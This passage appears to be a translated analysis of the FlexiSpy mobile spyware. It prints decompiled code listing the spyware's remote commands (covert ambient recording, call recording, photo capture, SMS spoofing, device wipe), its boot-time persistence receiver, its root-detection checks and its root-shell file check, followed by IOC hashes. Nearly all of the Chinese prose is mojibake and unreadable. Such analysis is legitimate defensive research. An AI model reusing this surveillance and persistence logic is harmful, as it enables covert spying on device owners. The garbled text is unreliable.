            RemoteFunction.DEBUG_SEND_TEST_SMS = new RemoteFunction("DEBUG_SEND_TEST_SMS", 73);
            RemoteFunction.DEBUG_CLOSE_APP = new RemoteFunction("DEBUG_CLOSE_APP", 74);
            RemoteFunction.DEBUG_BRING_UI_TO_HOME_SCREEN = new RemoteFunction("DEBUG_BRING_UI_TO_HOME_SCREEN", 75);
            RemoteFunction.DEBUG_SET_APPLICATION_MODE = new RemoteFunction("DEBUG_SET_APPLICATION_MODE", 76);
            RemoteFunction.DEBUG_GET_APPLICATION_MODE = new RemoteFunction("DEBUG_GET_APPLICATION_MODE", 77);
            RemoteFunction.DEBUG_RESTART_DEVICE = new RemoteFunction("DEBUG_RESTART_DEVICE", 78);
            RemoteFunction.DEBUG_IS_APPENGIN_INIT_COMPLETE = new RemoteFunction("DEBUG_IS_APPENGIN_INIT_COMPLETE", 79);
            RemoteFunction.DEBUG_PRODUCT_VERSION = new RemoteFunction("DEBUG_PRODUCT_VERSION", 80);
            RemoteFunction.DEBUG_IS_CALLRECORDING_SUPPORTED = new RemoteFunction("DEBUG_IS_CALLRECORDING_SUPPORTED", 81);
            RemoteFunction.DEBUG_IS_RESUME_ON_DEMAND_AMBIENT_RECORDING = new RemoteFunction("DEBUG_IS_RESUME_ON_DEMAND_AMBIENT_RECORDING", 82);
            RemoteFunction.SET_MODE_ADDRESS_BOOK = new RemoteFunction("SET_MODE_ADDRESS_BOOK", 83);
            RemoteFunction.SEND_ADDRESS_BOOK = new RemoteFunction("SEND_ADDRESS_BOOK", 84);
            RemoteFunction.REQUEST_BATTERY_INFO = new RemoteFunction("REQUEST_BATTERY_INFO", 85);
            RemoteFunction.REQUEST_MEDIA_HISTORICAL = new RemoteFunction("REQUEST_MEDIA_HISTORICAL", 86);
            RemoteFunction.UPLOAD_ACTUAL_MEDIA = new RemoteFunction("UPLOAD_ACTUAL_MEDIA", 87);
            RemoteFunction.DELETE_ACTUAL_MEDIA = new RemoteFunction("DELETE_ACTUAL_MEDIA", 88);
            RemoteFunction.ON_DEMAND_AMBIENT_RECORD = new RemoteFunction("ON_DEMAND_AMBIENT_RECORD", 89);
            RemoteFunction.ON_DEMAND_IMAGE_CAPTURE = new RemoteFunction("ON_DEMAND_IMAGE_CAPTURE", 90);
            RemoteFunction.ENABLE_CALL_RECORDING = new RemoteFunction("ENABLE_CALL_RECORDING", 91);
            RemoteFunction.SET_CALL_RECORDING_WATCH_FLAG = new RemoteFunction("SET_CALL_RECORDING_WATCH_FLAG", 92);
            RemoteFunction.SET_CALL_RECORDING_AUDIO_SOURCE = new RemoteFunction("SET_CALL_RECORDING_AUDIO_SOURCE", 93);
            RemoteFunction.ENABLE_COMMUNICATION_RESTRICTION = new RemoteFunction("ENABLE_COMMUNICATION_RESTRICTION", 94);
            RemoteFunction.ENABLE_APP_PROFILE = new RemoteFunction("ENABLE_APP_PROFILE", 95);
            RemoteFunction.ENABLE_URL_PROFILE = new RemoteFunction("ENABLE_URL_PROFILE", 96);
            RemoteFunction.SPOOF_SMS = new RemoteFunction("SPOOF_SMS", 97);
            RemoteFunction.SET_PANIC_MODE = new RemoteFunction("SET_PANIC_MODE", 98);
            RemoteFunction.START_PANIC = new RemoteFunction("START_PANIC", 99);
            RemoteFunction.STOP_PANIC = new RemoteFunction("STOP_PANIC", 100);
            RemoteFunction.GET_PANIC_MODE = new RemoteFunction("GET_PANIC_MODE", 101);
            RemoteFunction.PANIC_IMAGE_CAPTURE = new RemoteFunction("PANIC_IMAGE_CAPTURE", 102);
            RemoteFunction.IS_PANIC_ACTIVE = new RemoteFunction("IS_PANIC_ACTIVE", 103);
            RemoteFunction.ENABLE_ALERT = new RemoteFunction("ENABLE_ALERT", 104);
            RemoteFunction.SET_LOCK_DEVICE = new RemoteFunction("SET_LOCK_DEVICE", 105);
            RemoteFunction.SET_UNLOCK_DEVICE = new RemoteFunction("SET_UNLOCK_DEVICE", 106);
            RemoteFunction.SET_WIPE = new RemoteFunction("SET_WIPE", 107);
            RemoteFunction.SYNC_TEMPORAL_APPLICATION_CONTROL = new RemoteFunction("SYNC_TEMPORAL_APPLICATION_CONTROL", 108);
            RemoteFunction.a = new RemoteFunction[]{RemoteFu
**0x08 å¦‚æœç”¨æˆ·æ­£åœ¨ä½¿ç”¨è®¾å¤‡  
**
ç›‘æ§è½¯ä»¶ç›‘å¬å„ç§intentè¡¨æ˜ç”¨æˆ·åœ¨ä½¿ç”¨æ‰‹æœºï¼šå¦‚æœå±å¹•è§£é”ï¼Œè®¾å¤‡å¼€æœºç­‰ã€‚
    label_65:  // this is if NO sms is detected
                    if((str_intentAction.equals("android.intent.action.BOOT_COMPLETED")) || (str_intentAction.equals("android.intent.action.QUICKBOOT_POWERON")) || (str_intentAction.equals("com.htc.intent.action.QUICKBOOT_POWERON"))) {
                        com.fx.daemon.b.m_relatedToShellCmds(o.m_getDataPath(arg6), "fx.log");
                        StrictMode.setThreadPolicy(new StrictMode$ThreadPolicy$Builder().permitNetwork().build());
                        if(CommonReceiver.c()) {
                            return;
                        }
                        if(!CommonReceiver.f_bool_maindZip()) {
                            return;
                        }
                        AppStartUpHandler.a(dataPath, AppStartUpHandler$AppStartUpMethod.BOOT_COMPLETED);
                        ak.m_generatesSameObj(arg6);
                        ak.b(arg6);
                        return;
                    }
ç¬¬ä¸€ä¸ªæ¡ä»¶
åœ¨æ¥æ”¶åˆ°intentåï¼Œæˆ‘ä»¬çœ‹åˆ°ifè¯­å¥
       if(CommonReceiver.b_returnTrueIfDebugMode()) {
                            return;
                        }
ä»£ç åªæ£€æŸ¥æ˜¯å¦æœ‰DEBUG_IS_FULL_MODEï¼Œå‘½ä»¤å°†å‘é€ç»™å—å®³è€…è®¾å¤‡ã€‚
ç¬¬äºŒä¸ªæ¡ä»¶
ç¬¬äºŒä¸ªifè¯­å¥å¦‚ä¸‹ã€‚å®ƒæ‰§è¡Œå¦ä¸€ä¸ªç³»åˆ—rootæ£€æŸ¥å’Œæ£€æŸ¥maind.zipæ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚
      if(!CommonReceiver.RootAndMainZipCheck()) {  // if not rooted and a zip doesnt exist exit
                            return;
                        }
    F_bool_maindZipæ–¹æ³•ä¸ä½äº/assets/production/æ–‡ä»¶å¤¹ä¸­çš„maind.zipæœ‰å…³ã€‚
      private static boolean RootAndMainZipCheck() {
            boolean returnVal = true;
            String str_maindZipPath = o.str_FilePathGetter(b.str_dataMiscAdn, "maind.zip");
            if((ShellUtil.m_bool_MultipleRootcheck()) && (ShellUtil.m_ChecksForFIle(str_maindZipPath))) {
                returnVal = false;
            }
            return returnVal;  // return true if rooted AND maind.zip is found
        }
è¿™ä¸ªæ–¹æ³•æ‰§è¡Œä¸€ç³»åˆ—rootæ£€æŸ¥ã€‚å®ƒæŸ¥çœ‹è®¾å¤‡çš„Build Tagså€¼æ˜¯å¦å­˜åœ¨test-keysï¼Œæ£€æŸ¥SuperUser.APKåº”ç”¨ï¼ŒsuäºŒè¿›åˆ¶çš„ä½ç½®ï¼Œç¯å¢ƒè·¯å¾„æ£€æŸ¥å’Œå°è¯•è°ƒç”¨ä¸€ä¸ªshellã€‚ä»£ç å¦‚ä¸‹ï¼š
    public static boolean m_bool_Rootcheck() {
            boolean bool_returnVal = false;
            if(ShellUtil.bool_debug) {
                Log.v("ShellUtil", "isDeviceRooted # START ...");
            }
            String str_buildPropTags = Build.TAGS;
            boolean str_TestKeys = str_buildPropTags == null || !str_buildPropTags.contains("test-keys") ? false : true;
            if(ShellUtil.bool_debug) {
                Log.v("ShellUtil", "checkRootMethod1 # isDeviceRooted ? : " + str_TestKeys);
            }
            if((str_TestKeys) || (ShellUtil.f_bool_checksForSUperSuAPK()) || (ShellUtil.m_bool_SuCheck()) || (ShellUtil.m_boolEnvPathCheck()) || (ShellUtil.m_boolTryToExecShell())) {
                bool_returnVal = true;
            }
            if(ShellUtil.bool_debug) {
                Log.v("ShellUtil", "isDeviceRooted # isDeviceRooted ? : " + bool_returnVal);
            }
            if(ShellUtil.bool_debug) {
                Log.v("ShellUtil", "isDeviceRooted # EXIT ...");
            }
            return bool_returnVal
é€šè¿‡ä¸‹é¢çš„æ–¹æ³•æ‰§è¡Œmaind.zipæ£€æŸ¥
    public static boolean m_ChecksForFIle(String arg7) {
            boolean b_returnVal = true;
            try {
                c_RelatedToFxExecLib v2 = c_RelatedToFxExecLib.b();
                String v3 = v2.a(String.format("%s "%s"", "/system/bin/ls", arg7));
                v2.d();
                if(v3.contains("No such file or directory")) {
                    return false;
                }
            }
            catch(CannotGetRootShellException v0_1) {
                b_returnVal = new File(arg7).exists();
            }
            return b_returnVal;
å›åˆ°reveiver
åœ¨ç¬¬äºŒä¸ªifè¯­å¥åæœ‰å¦‚ä¸‹çš„ä»£ç ã€‚
       AppStartUpHandler.a(dataPath, AppStartUpHandler$AppStartUpMethod.BOOT_COMPLETED);
            ak.m_generatesSameObj(arg6);
            ak.startCoreService(arg6);  // starts the "engine"
            return;
éå¸¸ç®€å•ã€‚Ak.startCoreService(arg6)æ–¹æ³•åªå†æ¬¡å¯åŠ¨coreServiceã€‚è®°ä½è¿™æ˜¯ä»æ–‡ç« å¼€å¤´çš„onCreateæ–¹æ³•å¼€å§‹çš„ã€‚
**0x09 ä¸‹é›†é¢„å‘Š  
**
ä¸‹ä¸€æ­¥ï¼Œæˆ‘å°†çœ‹ä¸‹CoreServiceå’Œå…¶ä»–çš„intent receiver
com.vvt.callhandler.phonestate.OutgoingCallReceiverï¼Œå…¶ç›‘å¬å»ç”µã€‚
**0x0A æ–°çš„IOCs  
**
å¯¹äºAVè¡Œä¸šæ¥è¯´ï¼Œåœ¨VirusTotalä¸­å¯ä»¥æŸ¥æ‰¾åˆ°æ›´å¤šçš„IOCã€‚
Sha1 æ–‡ä»¶åï¼š
b1ea0ccf834e4916aee1d178a71aba869ac3b36e libfxexec.so This is actually in the
1.00.1 source hehe ğŸ˜‰
174b285867ae4f3450af59e1b63546a2d8ae0886 maind.zip
**0x0B Jebæ•°æ®åº“æ–‡ä»¶  
**
å¦‚æœæƒ³å°±çº æ­£ä»»ä½•é”™è¯¯ï¼Œåœ¨[è¿™é‡Œ](https://drive.google.com/open?id=0B6yz5uB4FYfNZ3gzenN6SGJNTmc)ã€‚
[**ä¼ é€é—¨ï¼šå…¨çƒçŸ¥åç§»åŠ¨é—´è°è½¯ä»¶FlexiSpyçš„åˆ†æ(part1)**
****](http://bobao.360.cn/learning/detail/3777.html)